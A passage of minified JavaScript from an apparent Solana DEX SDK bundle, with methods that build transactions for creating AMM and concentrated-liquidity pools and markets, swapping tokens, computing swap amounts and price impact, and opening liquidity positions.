        getEphemeralSigners: f,
        txVersion: h,
        feePayer: p,
      }) {
        if (
          ((!1 === this.scope.availability.removeStandardPosition ||
            !1 === this.scope.availability.createConcentratedPosition) &&
            this.logAndCreateError(
              "remove liquidity or create position feature disabled in your region"
            ),
          (t.mintA.address !== e.mintA.address &&
            t.mintA.address !== e.mintB.address) ||
            (t.mintB.address !== e.mintA.address &&
              t.mintB.address !== e.mintB.address))
        )
          throw Error("mint check error");
        let m = this.createTxBuilder(p),
          g = {};
        for (let P of this.scope.account.tokenAccountRawInfos)
          (void 0 === g[P.accountInfo.mint.toString()] ||
            h_(this.scope.ownerPubKey, P.accountInfo.mint, _c).publicKey.equals(
              P.pubkey
            )) &&
            (g[P.accountInfo.mint.toString()] = P.pubkey);
        let y = g[t.lpMint.address];
        if (void 0 === y)
          throw Error("find lp account error in trade accounts");
        let w = n.add(null != i ? i : new Zn(0)),
          b = t.mintA.address === GI.WSOL.mint.toString(),
          v = t.mintB.address === GI.WSOL.mint.toString(),
          { account: A, instructionParams: k } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: _c,
              mint: new Xi(t.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo: b ? { payer: this.scope.ownerPubKey } : void 0,
              skipCloseAccount: !b,
              notUseTokenAccount: b,
              associatedOnly: !0,
              checkCreateATAOwner: d,
            });
        if ((m.addInstruction(k || {}), void 0 === A))
          throw new Error("base token account not found");
        let { account: I, instructionParams: S } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: _c,
            mint: new Xi(t.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo: v
              ? { payer: this.scope.ownerPubKey, amount: 0 }
              : void 0,
            skipCloseAccount: !v,
            notUseTokenAccount: v,
            associatedOnly: !0,
            checkCreateATAOwner: d,
          });
        if ((m.addInstruction(S || {}), void 0 === I))
          throw new Error("quote token account not found");
        if (
          ((g[t.mintA.address] = A),
          (g[t.mintB.address] = I),
          void 0 !== o && (null == i || !i.isZero()))
        ) {
          let t,
            e = TC[o.programId],
            n = EC({
              programId: new Xi(o.programId),
              poolId: new Xi(o.id),
              owner: this.scope.ownerPubKey,
              version: e,
            }),
            r = await this.scope.connection.getAccountInfo(n);
          if ((r && (t = RC(e).decode(r.data)), 6 !== e && !t)) {
            let { instruction: t, instructionType: r } = MC({
              id: new Xi(o.id),
              programId: new Xi(o.programId),
              version: e,
              ledger: n,
              owner: this.scope.ownerPubKey,
            });
            m.addInstruction({ instructions: [t], instructionTypes: [r] });
          }
          let s = [];
          for (let i of o.rewardInfos) {
            let t = i.mint.address === GI.WSOL.mint.toString();
            if (g[i.mint.address]) s.push(g[i.mint.address]);
            else {
              let { account: e, instructionParams: n } =
                await this.scope.account.getOrCreateTokenAccount({
                  mint: new Xi(i.mint.address),
                  tokenProgram: l,
                  owner: this.scope.ownerPubKey,
                  skipCloseAccount: !t,
                  createInfo: { payer: u || this.scope.ownerPubKey },
                  associatedOnly: !0,
                  checkCreateATAOwner: d,
                });
              e ||
                this.logAndCreateError(
                  "farm reward account not found:",
                  i.mint.address
                ),
                n && m.addInstruction(n),
                s.push(e);
            }
          }
          let a = (await this.scope.api.fetchFarmKeysById({ ids: o.id }))[0],
            f = {
              userAuxiliaryLedgers: c,
              amount: i,
              owner: this.scope.ownerPubKey,
              farmInfo: o,
              farmKeys: a,
              lpAccount: y,
              rewardAccounts: s,
            },
            h = TC[o.programId],
            p = 6 === h ? DC(f) : 5 === h ? UC(f) : qC(f),
            w = { 3: US, 5: KS, 6: jS };
          m.addInstruction({ instructions: [p], instructionTypes: [w[h]] });
        }
        let _ = await this.getAmmPoolKeys(t.id),
          T = ME({
            poolInfo: t,
            poolKeys: _,
            userKeys: {
              lpTokenAccount: y,
              baseTokenAccount: A,
              quoteTokenAccount: I,
              owner: this.scope.ownerPubKey,
            },
            lpAmount: w,
            baseAmountMin: 0,
            quoteAmountMin: 0,
          });
        m.addInstruction({
          instructions: [T],
          instructionTypes: [t.pooltype.includes("StablePool") ? MS : xS],
          lookupTableAddress: _.lookupTableAccount
            ? [_.lookupTableAccount]
            : [],
        });
        let [C, B] = t.mintA.address === e.mintA.address ? [A, I] : [I, A],
          E = await this.scope.clmm.getClmmPoolKeys(e.id),
          x = await iE.openPositionFromBaseInstructions(
            AA(
              vA(
                {
                  poolInfo: e,
                  poolKeys: E,
                  ownerInfo: {
                    feePayer: this.scope.ownerPubKey,
                    wallet: this.scope.ownerPubKey,
                    tokenAccountA: C,
                    tokenAccountB: B,
                  },
                  withMetadata: "create",
                },
                r
              ),
              { base: s, getEphemeralSigners: f }
            )
          );
        return (
          m.addInstruction({
            instructions: [...x.instructions],
            signers: x.signers,
            instructionTypes: [...x.instructionTypes],
            lookupTableAddress: E.lookupTableAccount
              ? [E.lookupTableAccount]
              : [],
          }),
          0 === h
            ? m.sizeCheckBuildV0({ computeBudgetConfig: a })
            : m.sizeCheckBuild({ computeBudgetConfig: a })
        );
      }
      async createPoolV4({
        programId: t,
        marketInfo: e,
        baseMintInfo: n,
        quoteMintInfo: r,
        baseAmount: o,
        quoteAmount: i,
        startTime: s,
        ownerInfo: a,
        associatedOnly: u = !1,
        checkCreateATAOwner: c = !1,
        tokenProgram: l,
        txVersion: d,
        feeDestinationId: f,
        computeBudgetConfig: h,
        txTipConfig: p,
        feePayer: m,
      }) {
        var g;
        let y =
            a.feePayer ||
            (null == (g = this.scope.owner) ? void 0 : g.publicKey),
          w = a.useSOLBalance && n.mint.equals(Bc),
          b = a.useSOLBalance && r.mint.equals(Bc),
          v = this.createTxBuilder(m),
          { account: A, instructionParams: k } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: n.mint,
              owner: this.scope.ownerPubKey,
              createInfo: w ? { payer: y, amount: o } : void 0,
              notUseTokenAccount: w,
              skipCloseAccount: !w,
              associatedOnly: !w && u,
              checkCreateATAOwner: c,
            });
        v.addInstruction(k || {});
        let { account: I, instructionParams: S } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: r.mint,
            owner: this.scope.ownerPubKey,
            createInfo: b ? { payer: y, amount: i } : void 0,
            notUseTokenAccount: b,
            skipCloseAccount: !b,
            associatedOnly: !b && u,
            checkCreateATAOwner: c,
          });
        if ((v.addInstruction(S || {}), void 0 === A || void 0 === I))
          throw Error("you don't has some token account");
        let _ = zE({
            version: 4,
            marketVersion: 3,
            marketId: e.marketId,
            baseMint: n.mint,
            quoteMint: r.mint,
            baseDecimals: n.decimals,
            quoteDecimals: r.decimals,
            programId: t,
            marketProgramId: e.programId,
          }),
          T = {
            programId: t,
            ammId: _.id,
            ammAuthority: _.authority,
            ammOpenOrders: _.openOrders,
            lpMint: _.lpMint,
            coinMint: _.baseMint,
            pcMint: _.quoteMint,
            coinVault: _.baseVault,
            pcVault: _.quoteVault,
            withdrawQueue: _.withdrawQueue,
            ammTargetOrders: _.targetOrders,
            poolTempLp: _.lpVault,
            marketProgramId: _.marketProgramId,
            marketId: _.marketId,
            ammConfigId: _.configId,
            feeDestinationId: f,
          },
          { instruction: C, instructionType: B } = LE(
            AA(vA({}, T), {
              userWallet: this.scope.ownerPubKey,
              userCoinVault: A,
              userPcVault: I,
              userLpVault: h_(this.scope.ownerPubKey, _.lpMint, l).publicKey,
              nonce: _.nonce,
              openTime: s,
              coinAmount: o,
              pcAmount: i,
            })
          );
        return (
          v.addInstruction({ instructions: [C], instructionTypes: [B] }),
          v.addCustomComputeBudget(h),
          v.addTipInstruction(p),
          v.versionBuild({ txVersion: d, extInfo: { address: T } })
        );
      }
      async createMarketAndPoolV4({
        programId: t = v_,
        marketProgram: e = w_,
        feeDestinationId: n = __,
        tokenProgram: r,
        baseMintInfo: o,
        quoteMintInfo: i,
        baseAmount: s,
        quoteAmount: a,
        startTime: u,
        ownerInfo: c,
        lowestFeeMarket: l,
        assignSeed: d,
        associatedOnly: f = !1,
        checkCreateATAOwner: h = !1,
        lotSize: p = 1,
        tickSize: m = 0.01,
        txVersion: g,
        computeBudgetConfig: y,
        txTipConfig: w,
        feePayer: b,
      }) {
        var v, A, k;
        let I = this.scope.ownerPubKey,
          S =
            c.feePayer ||
            (null == (v = this.scope.owner) ? void 0 : v.publicKey),
          _ = c.useSOLBalance && o.mint.equals(Bc),
          T = c.useSOLBalance && i.mint.equals(Bc),
          C = d
            ? `${o.mint.toBase58().slice(0, 7)}-${i.mint
                .toBase58()
                .slice(0, 7)}-${d}`
            : void 0,
          B = ZT({
            fromPublicKey: I,
            programId: e,
            assignSeed: C && `${C}-market`,
          }),
          E = ZT({
            fromPublicKey: I,
            programId: e,
            assignSeed: C && `${C}-request`,
          }),
          x = ZT({
            fromPublicKey: I,
            programId: e,
            assignSeed: C && `${C}-event`,
          }),
          P = ZT({
            fromPublicKey: I,
            programId: e,
            assignSeed: C && `${C}-bids`,
          }),
          R = ZT({
            fromPublicKey: I,
            programId: e,
            assignSeed: C && `${C}-asks`,
          }),
          O = ZT({
            fromPublicKey: I,
            programId: _c,
            assignSeed: C && `${C}-baseVault`,
          }),
          M = ZT({
            fromPublicKey: I,
            programId: _c,
            assignSeed: C && `${C}-quoteVault`,
          }),
          L = new Zn(100);
        let { vaultOwner: N, vaultSignerNonce: D } = (function () {
            let t = new Zn(0);
            for (;;)
              try {
                return {
                  vaultOwner: Xi.createProgramAddressSync(
                    [B.publicKey.toBuffer(), t.toArrayLike(ct, "le", 8)],
                    e
                  ),
                  vaultSignerNonce: t,
                };
              } catch {
                if ((t.iaddn(1), t.gt(new Zn(25555))))
                  throw Error("find vault owner error");
              }
          })(),
          U = new Zn(Math.round(10 ** o.decimals * p)),
          q = new Zn(Math.round(p * 10 ** i.decimals * m));
        if (U.eq(QI)) throw Error("lot size is too small");
        if (q.eq(QI)) throw Error("tick size or lot size is too small");
        let W = await GE({
            connection: this.scope.connection,
            wallet: this.scope.ownerPubKey,
            marketInfo: {
              programId: e,
              vaultOwner: N,
              baseMint: o.mint,
              quoteMint: i.mint,
              id: B,
              baseVault: O,
              quoteVault: M,
              requestQueue: E,
              eventQueue: x,
              bids: P,
              asks: R,
              feeRateBps: 0,
              quoteDustThreshold: L,
              vaultSignerNonce: D,
              baseLotSize: U,
              quoteLotSize: q,
              lowestFeeMarket: l,
            },
          }),
          z = this.createTxBuilder(b);
        z.addInstruction({
          instructions: W[0].transaction.instructions,
          signers: W[0].signer,
        });
        for await (let Y of W.slice(1, W.length))
          z.addInstruction({
            instructions: Y.transaction.instructions,
            signers: Y.signer,
            instructionTypes: Y.instructionTypes,
          });
        let { account: K, instructionParams: F } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: o.mint,
            owner: this.scope.ownerPubKey,
            createInfo: _ ? { payer: S, amount: s } : void 0,
            notUseTokenAccount: _,
            skipCloseAccount: !_,
            associatedOnly: !_ && f,
            checkCreateATAOwner: h,
            assignSeed: _ && C ? `${C}-wsol` : void 0,
          });
        z.addInstruction(F || {});
        let { account: j, instructionParams: G } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: i.mint,
            owner: this.scope.ownerPubKey,
            createInfo: T ? { payer: S, amount: a } : void 0,
            notUseTokenAccount: T,
            skipCloseAccount: !T,
            associatedOnly: !T && f,
            checkCreateATAOwner: h,
            assignSeed: T && C ? `${C}-wsol` : void 0,
          });
        if ((z.addInstruction(G || {}), void 0 === K))
          throw Error("you don't has base token account");
        if (void 0 === j) throw Error("you don't has quote token account");
        let V = zE({
            version: 4,
            marketVersion: 3,
            marketId: B.publicKey,
            baseMint: o.mint,
            quoteMint: i.mint,
            baseDecimals: o.decimals,
            quoteDecimals: i.decimals,
            programId: t,
            marketProgramId: e,
          }),
          H = {
            programId: t,
            ammId: V.id,
            ammAuthority: V.authority,
            ammOpenOrders: V.openOrders,
            lpMint: V.lpMint,
            coinMint: V.baseMint,
            pcMint: V.quoteMint,
            coinVault: V.baseVault,
            pcVault: V.quoteVault,
            withdrawQueue: V.withdrawQueue,
            ammTargetOrders: V.targetOrders,
            poolTempLp: V.lpVault,
            marketProgramId: V.marketProgramId,
            marketId: V.marketId,
            ammConfigId: V.configId,
            feeDestinationId: n,
          },
          { instruction: X, instructionType: Z } = LE(
            AA(vA({}, H), {
              userWallet: this.scope.ownerPubKey,
              userCoinVault: K,
              userPcVault: j,
              userLpVault: h_(this.scope.ownerPubKey, V.lpMint, r).publicKey,
              nonce: V.nonce,
              openTime: u,
              coinAmount: s,
              pcAmount: a,
            })
          );
        z.addInstruction({ instructions: [X], instructionTypes: [Z] });
        let J =
          _ || T
            ? [
                (null == (A = null == F ? void 0 : F.instructions)
                  ? void 0
                  : A[0]) ||
                  (null == (k = null == G ? void 0 : G.instructions)
                    ? void 0
                    : k[0]),
              ].filter((t) => !!t)
            : void 0;
        return 0 === g
          ? z.sizeCheckBuildV0({
              computeBudgetConfig: y,
              splitIns: J,
              address: vA(
                {
                  requestQueue: E.publicKey,
                  eventQueue: x.publicKey,
                  bids: P.publicKey,
                  asks: R.publicKey,
                  baseVault: O.publicKey,
                  quoteVault: M.publicKey,
                  baseMint: new Xi(o.mint),
                  quoteMint: new Xi(i.mint),
                },
                H
              ),
            })
          : z.sizeCheckBuild({
              computeBudgetConfig: y,
              splitIns: J,
              address: vA(
                {
                  requestQueue: E.publicKey,
                  eventQueue: x.publicKey,
                  bids: P.publicKey,
                  asks: R.publicKey,
                  baseVault: O.publicKey,
                  quoteVault: M.publicKey,
                  baseMint: new Xi(o.mint),
                  quoteMint: new Xi(i.mint),
                },
                H
              ),
            });
      }
      async getCreatePoolFee({ programId: t }) {
        let e = UE({ programId: t }),
          n = await this.scope.connection.getAccountInfo(e, {
            dataSlice: { offset: 536, length: 8 },
          });
        if (null === n) throw Error("get config account error");
        return yE.decode(n.data).fee;
      }
      computeAmountOut({
        poolInfo: t,
        amountIn: e,
        mintIn: n,
        mintOut: r,
        slippage: o,
      }) {
        let [i, s] = [n.toString(), r.toString()];
        if (i !== t.mintA.address && i !== t.mintB.address)
          throw new Error("toke not match");
        if (s !== t.mintA.address && s !== t.mintB.address)
          throw new Error("toke not match");
        let { baseReserve: a, quoteReserve: u } = t,
          c = [a, u],
          l = [t.mintA.decimals, t.mintB.decimals],
          d = i == t.mintA.address ? "base" : "quote";
        "quote" === d && (c.reverse(), l.reverse());
        let f,
          [h, p] = c,
          [m, g] = l,
          y = 4 === t.version;
        if (y)
          f = new mI(p.toString())
            .div(10 ** g)
            .div(new mI(h.toString()).div(10 ** m));
        else {
          let t = xE(
            this.stableLayout.stableModelData,
            a.toNumber(),
            u.toNumber()
          );
          f =
            "quote" === d ? new mI(1e6).div(1e6 * t) : new mI(1e6 * t).div(1e6);
        }
        let w = e,
          b = new Zn(0),
          v = new Zn(0);
        if (!w.isZero())
          if (y) {
            v = q_(w.mul(lE), dE);
            let t = w.sub(v),
              e = h.add(t);
            b = p.mul(t).div(e);
          } else {
            v = w.mul(new Zn(2)).div(new Zn(1e4));
            let t = w.sub(v);
            b = new Zn(
              "quote" === d
                ? (function (t, e, n, r) {
                    let o = IE(t, e, n),
                      i = SE(t, e, o),
                      s = SE(t, n, o),
                      a = SE(t, r, o),
                      [u, c, l, d] = BE(t, i, a, !0);
                    return d
                      ? l
                        ? (r * t.multiplier) / u
                        : _E(t, s - c, o)
                      : 0;
                  })(
                    this.stableLayout.stableModelData,
                    u.toNumber(),
                    a.toNumber(),
                    t.toNumber()
                  )
                : EE(
                    this.stableLayout.stableModelData,
                    u.toNumber(),
                    a.toNumber(),
                    t.toNumber()
                  )
            );
          }
        let A = new Zn(new mI(b.toString()).mul(1 - o).toFixed(0)),
          k = b,
          I = A,
          S = new mI(b.toString()).div(new mI(w.sub(v).toString()).toFixed(0));
        !w.isZero() &&
          !b.isZero() &&
          (S = new mI(b.toString())
            .div(10 ** g)
            .div(new mI(w.sub(v).toString()).div(10 ** m)));
        let _ = f.sub(S).div(f).mul(100);
        return {
          amountOut: k,
          minAmountOut: I,
          currentPrice: f,
          executionPrice: S,
          priceImpact: _,
          fee: v,
        };
      }
      computeAmountIn({
        poolInfo: t,
        amountOut: e,
        mintIn: n,
        mintOut: r,
        slippage: o,
      }) {
        let { baseReserve: i, quoteReserve: s } = t;
        n.toString() !== t.mintA.address &&
          n.toString() !== t.mintB.address &&
          this.logAndCreateError("mintIn does not match pool"),
          r.toString() !== t.mintA.address &&
            r.toString() !== t.mintB.address &&
            this.logAndCreateError("mintOut does not match pool"),
          this.logDebug("baseReserve:", i.toString()),
          this.logDebug("quoteReserve:", s.toString());
        let a = n.toString() === t.mintA.address,
          [u, c] = a ? [t.mintA, t.mintB] : [t.mintB, t.mintA];
        this.logDebug("currencyOut:", c.symbol || c.address),
          this.logDebug(
            "amountOut:",
            new mI(e.toString())
              .div(10 ** c.decimals)
              .toDecimalPlaces(c.decimals)
              .toString(),
            u.symbol || u.address
          ),
          this.logDebug("slippage:", 100 * o + "%");
        let l = [i, s],
          d = a ? "quote" : "base";
        "base" === d && l.reverse(), this.logDebug("output side:", d);
        let [f, h] = l,
          p = new mI(h.toString())
            .div(10 ** t[a ? "mintB" : "mintA"].decimals)
            .div(
              new mI(f.toString()).div(10 ** t[a ? "mintA" : "mintB"].decimals)
            );
        this.logDebug(
          "currentPrice:",
          `1 ${u.symbol || u.address} ≈ ${p.toString()} ${
            c.symbol || c.address
          }`
        ),
          this.logDebug(
            "currentPrice invert:",
            `1 ${c.symbol || c.address} ≈ ${new mI(1).div(p).toString()} ${
              u.symbol || u.address
            }`
          );
        let m = new Zn(0),
          g = e;
        if (!g.isZero()) {
          g.gt(h) && (g = h.sub(new Zn(1)));
          let t = h.sub(g);
          m = f.mul(g).div(t).mul(dE).div(dE.sub(lE));
        }
        let y = new Zn(new mI(m.toString()).mul(1 + o).toFixed(0)),
          w = m,
          b = y;
        this.logDebug(
          "amountIn:",
          new mI(w.toString())
            .div(10 ** u.decimals)
            .toDecimalPlaces(u.decimals)
            .toString()
        ),
          this.logDebug(
            "maxAmountIn:",
            new mI(b.toString())
              .div(10 ** u.decimals)
              .toDecimalPlaces(u.decimals)
              .toString()
          );
        let v = null;
        !m.isZero() &&
          !g.isZero() &&
          ((v = new mI(g.toString())
            .div(10 ** c.decimals)
            .div(new mI(m.toString()).div(10 ** u.decimals))),
          this.logDebug(
            "executionPrice:",
            `1 ${c.symbol || c.address} ≈ ${v
              .toDecimalPlaces(Math.max(t.mintA.decimals, t.mintB.decimals))
              .toString()} ${u.symbol || u.address}`
          ),
          this.logDebug(
            "executionPrice invert:",
            `1 ${c.symbol || c.address} ≈ ${new mI(1)
              .div(v)
              .toDecimalPlaces(Math.max(t.mintA.decimals, t.mintB.decimals))
              .toString()} ${u.symbol || u.address}`
          ));
        let A = p.mul(w.toString()),
          k = A.sub(e.toString()).abs().div(A);
        return (
          this.logDebug("priceImpact:", `${k.toString()}%`),
          {
            amountIn: w,
            maxAmountIn: b,
            currentPrice: p,
            executionPrice: v,
            priceImpact: k,
          }
        );
      }
      async swap({
        poolInfo: t,
        poolKeys: e,
        amountIn: n,
        amountOut: r,
        inputMint: o,
        fixedSide: i,
        txVersion: s,
        config: a,
        computeBudgetConfig: u,
        txTipConfig: c,
        feePayer: l,
      }) {
        let d = this.createTxBuilder(l),
          {
            associatedOnly: f = !0,
            inputUseSolBalance: h = !0,
            outputUseSolBalance: p = !0,
          } = a || {},
          [m, g] =
            o === t.mintA.address ? [t.mintA, t.mintB] : [t.mintB, t.mintA],
          y = h && m.address === zI.toBase58(),
          w = p && g.address === zI.toBase58(),
          { account: b, instructionParams: v } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: _c,
              mint: new Xi(m.address),
              owner: this.scope.ownerPubKey,
              createInfo: y
                ? { payer: this.scope.ownerPubKey, amount: n }
                : void 0,
              skipCloseAccount: !y,
              notUseTokenAccount: y,
              associatedOnly: f,
            });
        d.addInstruction(v || {}),
          b ||
            this.logAndCreateError("input token account not found", {
              token: m.symbol || m.address,
              tokenAccountIn: b,
              inputTokenUseSolBalance: y,
              associatedOnly: f,
            });
        let { account: A, instructionParams: k } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: _c,
            mint: new Xi(g.address),
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !w,
            notUseTokenAccount: w,
            associatedOnly: !w && f,
          });
        d.addInstruction(k || {}),
          void 0 === A &&
            this.logAndCreateError("output token account not found", {
              token: g.symbol || g.address,
              tokenAccountOut: A,
              outputTokenUseSolBalance: w,
              associatedOnly: f,
            });
        let I = e || (await this.getAmmPoolKeys(t.id)),
          S = 4;
        return (
          t.pooltype.includes("StablePool") && (S = 5),
          d.addInstruction({
            instructions: [
              NE({
                version: S,
                poolKeys: I,
                userKeys: {
                  tokenAccountIn: b,
                  tokenAccountOut: A,
                  owner: this.scope.ownerPubKey,
                },
                amountIn: n,
                amountOut: r,
                fixedSide: i,
              }),
            ],
            instructionTypes: [4 === S ? PS : LS],
          }),
          d.addCustomComputeBudget(u),
          d.addTipInstruction(c),
          d.versionBuild({ txVersion: s })
        );
      }
      async getRpcPoolInfo(t) {
        return (await this.getRpcPoolInfos([t]))[t];
      }
      async getRpcPoolInfos(t, e) {
        let n = await xA(
            this.scope.connection,
            t.map((t) => ({ pubkey: new Xi(t) })),
            e
          ),
          r = {},
          o = [];
        for (let u = 0; u < t.length; u++) {
          let e = n[u];
          if (null === e || !e.accountInfo)
            throw Error("fetch pool info error: " + String(t[u]));
          let i = pE.decode(e.accountInfo.data);
          (r[String(t[u])] = AA(vA({}, i), { programId: e.accountInfo.owner })),
            o.push(i.baseVault, i.quoteVault);
        }
        let i = {},
          s = await xA(
            this.scope.connection,
            o.map((t) => ({ pubkey: new Xi(t) })),
            e
          );
        for (let u = 0; u < o.length; u++) {
          let t = s[u].accountInfo;
          if (null === t) throw Error("fetch vault info error: " + o[u]);
          i[String(o[u])] = new Zn(Yc.decode(t.data).amount.toString());
        }
        let a = {};
        for (let [u, c] of Object.entries(r)) {
          let t = i[c.baseVault.toString()].sub(c.baseNeedTakePnl),
            e = i[c.quoteVault.toString()].sub(c.quoteNeedTakePnl);
          a[u] = AA(vA({}, c), {
            baseReserve: t,
            mintAAmount: i[c.baseVault.toString()],
            mintBAmount: i[c.quoteVault.toString()],
            quoteReserve: e,
            poolPrice: new mI(e.toString())
              .div(new mI(10).pow(c.quoteDecimal.toString()))
              .div(
                new mI(t.toString()).div(
                  new mI(10).pow(c.baseDecimal.toString())
                )
              ),
          });
        }
        return a;
      }
      async getPoolInfoFromRpc({ poolId: t }) {
        let e = await this.getRpcPoolInfo(t),
          n = FE({ [t]: e });
        return {
          poolRpcData: e,
          poolInfo: n[t],
          poolKeys: (
            await this.scope.tradeV2.computePoolToPoolKeys({
              pools: [n[t]],
              ammRpcData: { [t]: e },
            })
          )[0],
        };
      }
    },
    XE = class extends iT {
      constructor(t) {
        super(t);
      }
      async getClmmPoolKeys(t) {
        return (await this.scope.api.fetchPoolKeysById({ idList: [t] }))[0];
      }
      async createPool(t) {
        var e;
        let {
            programId: n,
            owner: r = (null == (e = this.scope.owner)
              ? void 0
              : e.publicKey) || Xi.default,
            mint1: o,
            mint2: i,
            ammConfig: s,
            initialPrice: a,
            computeBudgetConfig: u,
            forerunCreate: c,
            getObserveState: l,
            txVersion: d,
            txTipConfig: f,
            feePayer: h,
          } = t,
          p = this.createTxBuilder(h),
          [m, g, y] = new Zn(new Xi(o.address).toBuffer()).gt(
            new Zn(new Xi(i.address).toBuffer())
          )
            ? [i, o, new mI(1).div(a)]
            : [o, i, a],
          w = DB.priceToSqrtPriceX64(y, m.decimals, g.decimals),
          b = [],
          v = [];
        m.programId === Tc.toBase58() &&
          v.push(CB(n, new Xi(m.address)).publicKey),
          g.programId === Tc.toBase58() &&
            v.push(CB(n, new Xi(g.address)).publicKey),
          (await this.scope.connection.getMultipleAccountsInfo(v)).forEach(
            (t, e) => {
              t && b.push(v[e]);
            }
          );
        let A = await iE.createPoolInstructions({
          connection: this.scope.connection,
          programId: n,
          owner: r,
          mintA: m,
          mintB: g,
          ammConfigId: s.id,
          initialPriceX64: w,
          forerunCreate: !l && c,
          extendMintAccount: b,
        });
        return (
          p.addInstruction(A),
          p.addCustomComputeBudget(u),
          p.addTipInstruction(f),
          p.versionBuild({
            txVersion: d,
            extInfo: {
              address: AA(vA({}, A.address), {
                observationId: A.address.observationId.toBase58(),
                exBitmapAccount: A.address.exBitmapAccount.toBase58(),
                programId: n.toString(),
                id: A.address.poolId.toString(),
                mintA: m,
                mintB: g,
                openTime: "0",
                vault: {
                  A: A.address.mintAVault.toString(),
                  B: A.address.mintBVault.toString(),
                },
                rewardInfos: [],
                config: {
                  id: s.id.toString(),
                  index: s.index,
                  protocolFeeRate: s.protocolFeeRate,
                  tradeFeeRate: s.tradeFeeRate,
                  tickSpacing: s.tickSpacing,
                  fundFeeRate: s.fundFeeRate,
                  description: s.description,
                  defaultRange: 0,
                  defaultRangePoint: [],
                },
              }),
              mockPoolInfo: vA(
                {
                  type: "Concentrated",
                  rewardDefaultPoolInfos: "Clmm",
                  id: A.address.poolId.toString(),
                  mintA: m,
                  mintB: g,
                  feeRate: s.tradeFeeRate,
                  openTime: "0",
                  programId: n.toString(),
                  price: y.toNumber(),
                  config: {
                    id: s.id.toString(),
                    index: s.index,
                    protocolFeeRate: s.protocolFeeRate,
                    tradeFeeRate: s.tradeFeeRate,
                    tickSpacing: s.tickSpacing,
                    fundFeeRate: s.fundFeeRate,
                    description: s.description,
                    defaultRange: 0,
                    defaultRangePoint: [],
                  },
                  burnPercent: 0,
                },
                nB
              ),
              forerunCreate: c,
            },
          })
        );
      }
      async openPositionFromBase({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        base: i,
        baseAmount: s,
        otherAmountMax: a,
        nft2022: u,
        associatedOnly: c = !0,
        checkCreateATAOwner: l = !1,
        withMetadata: d = "create",
        getEphemeralSigners: f,
        computeBudgetConfig: h,
        txTipConfig: p,
        txVersion: m,
        feePayer: g,
      }) {
        !1 === this.scope.availability.addConcentratedPosition &&
          this.logAndCreateError(
            "add position feature disabled in your region"
          ),
          this.scope.checkOwner();
        let y = this.createTxBuilder(g),
          w = null,
          b = null,
          v = n.useSOLBalance && t.mintA.address === zI.toString(),
          A = n.useSOLBalance && t.mintB.address === zI.toString(),
          [k, I] = "MintA" === i ? [s, a] : [a, s],
          { account: S, instructionParams: _ } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Xi(t.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo:
                v || k.isZero()
                  ? { payer: this.scope.ownerPubKey, amount: k }
                  : void 0,
              skipCloseAccount: !v,
              notUseTokenAccount: v,
              associatedOnly: !v && c,
              checkCreateATAOwner: l,
            });
        S && (w = S), y.addInstruction(_ || {});
        let { account: T, instructionParams: C } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: t.mintB.programId,
            mint: new Xi(t.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              A || I.isZero()
                ? { payer: this.scope.ownerPubKey, amount: I }
                : void 0,
            skipCloseAccount: !A,
            notUseTokenAccount: A,
            associatedOnly: !A && c,
            checkCreateATAOwner: l,
          });
        T && (b = T),
          y.addInstruction(C || {}),
          (!w || !b) &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              {
                ownerTokenAccountA: null == w ? void 0 : w.toBase58(),
                ownerTokenAccountB: null == b ? void 0 : b.toBase58(),
              }
            );
        let B = e || (await this.getClmmPoolKeys(t.id)),
          E = await iE.openPositionFromBaseInstructions({
            poolInfo: t,
            poolKeys: B,
            ownerInfo: AA(vA({}, n), {
              feePayer: this.scope.ownerPubKey,
              wallet: this.scope.ownerPubKey,
              tokenAccountA: w,
              tokenAccountB: b,
            }),
            tickLower: r,
            tickUpper: o,
            base: i,
            baseAmount: s,
            otherAmountMax: a,
            withMetadata: d,
            getEphemeralSigners: f,
            nft2022: u,
          });
        return (
          y.addInstruction(E),
          y.addCustomComputeBudget(h),
          y.addTipInstruction(p),
          y.versionBuild({ txVersion: m, extInfo: vA({}, E.address) })
        );
      }
      async openPositionFromLiquidity({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        amountMaxA: r,
        amountMaxB: o,
        tickLower: i,
        tickUpper: s,
        liquidity: a,
        associatedOnly: u = !0,
        checkCreateATAOwner: c = !1,
        withMetadata: l = "create",
        txVersion: d,
        computeBudgetConfig: f,
        txTipConfig: h,
        getEphemeralSigners: p,
        nft2022: m,
        feePayer: g,
      }) {
        !1 === this.scope.availability.createConcentratedPosition &&
          this.logAndCreateError(
            "open position feature disabled in your region"
          );
        let y = this.createTxBuilder(g),
          w = null,
          b = null,
          v = n.useSOLBalance && t.mintA.address === zI.toBase58(),
          A = n.useSOLBalance && t.mintB.address === zI.toBase58(),
          { account: k, instructionParams: I } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Xi(t.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo:
                v || r.isZero()
                  ? { payer: this.scope.ownerPubKey, amount: r }
                  : void 0,
              skipCloseAccount: !v,
              notUseTokenAccount: v,
              associatedOnly: !v && u,
              checkCreateATAOwner: c,
            });
        k && (w = k), y.addInstruction(I || {});
        let { account: S, instructionParams: _ } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: t.mintB.programId,
            mint: new Xi(t.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              A || o.isZero()
                ? { payer: this.scope.ownerPubKey, amount: o }
                : void 0,
            skipCloseAccount: !A,
            notUseTokenAccount: A,
